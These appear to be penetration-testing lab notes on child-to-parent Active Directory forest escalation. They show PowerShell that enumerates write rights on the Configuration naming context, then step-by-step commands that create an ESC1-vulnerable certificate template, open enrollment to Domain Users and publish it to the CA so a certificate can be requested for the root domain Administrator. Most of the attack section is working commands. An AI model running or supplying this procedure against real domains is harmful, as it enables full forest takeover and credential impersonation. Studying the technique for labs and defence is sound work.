
1. Enumerate DC rights for NC:

```powershell

$dn = "CN=Configuration,DC=INLANEFREIGHT,DC=AD"
$acl = Get-Acl -Path "AD:\$dn"
$acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }

# example output
ActiveDirectoryRights : GenericAll
...
IdentityReference : NT AUTHORITY\SYSTEM

# that means that NT AUTHORITY\SYSTEM has full control of Configuration NC!!!

```

Possible follow ups:


* `ADCS (Active Directory Certificate Services) attacks`
* `Group Policy Objects (GPOs) manipulation` 
* `DNS entries changes` 
* `GoldenGMSA (Group Managed Service Account) attacks`

We go fro ADCS abuse in here.

2. Being `Administrator` user in a compromise child domain create a new vulnerable `Certificate Template` within `pKICertificateTemplate` object.
3. `Administrator` user of the child domain self assigns  `Full Control` rights over the created Certificate Template.
4. Publish the created template to the CA server by modifying the `pKIEnrollmentService` object of the CA inside the `Enrollment Services` container.
5. 1. After the Configuration NC is replicated back to the parent domain, request the certificate for `root\Administrator` from the child domain.

```powershell
#### Certificate Template Vulnerable for ESC1

Install-Module -Name ADCSTemplate -Force 
Import-Module ADCSTemplate

Export-ADCSTemplate -DisplayName "User" > C:\vuln-esc1.json

#Edit in JSON
"msPKI-Certificate-Name-Flag": 0, -> 1,
#check: Client Authentication (must be present) 
"pKIExtendedKeyUsage": [ "1.3.6.1.5.5.7.3.2" ],

New-ADCSTemplate `
    -DisplayName "Vuln-ESC1" `
    -JSON (Get-Content C:\vuln-esc1.json -Raw) `
    -Publish `
    -Identity "Domain Users"   # or any low-priv group you want to allow enrollment
   
   
Import-Module ADCSAdministration Add-CATemplate -Name "Vuln-ESC1"
```